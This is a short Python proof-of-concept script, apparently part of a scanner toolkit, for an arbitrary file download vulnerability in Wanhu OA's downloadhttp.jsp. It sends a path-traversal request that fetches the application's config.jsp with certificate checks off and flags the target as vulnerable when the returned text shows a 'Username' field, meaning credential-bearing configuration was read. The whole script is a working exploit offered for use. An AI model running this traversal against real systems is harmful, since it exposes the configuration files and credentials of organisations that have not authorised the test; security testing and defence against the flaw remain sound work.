import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 万户OA_download_http(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    exp_url = urldata + "defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers, verify=False)
        if respones.status_code == 200 and 'Username' in respones.text:
            print(Vcolors.RED +  "[+] 万户OA downloadhttp.jsp 任意文件下载漏洞存在{}".format(exp_url)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 万户OA downloadhttp.jsp 任意文件下载漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("万户OA_download_http脚本出现异常")

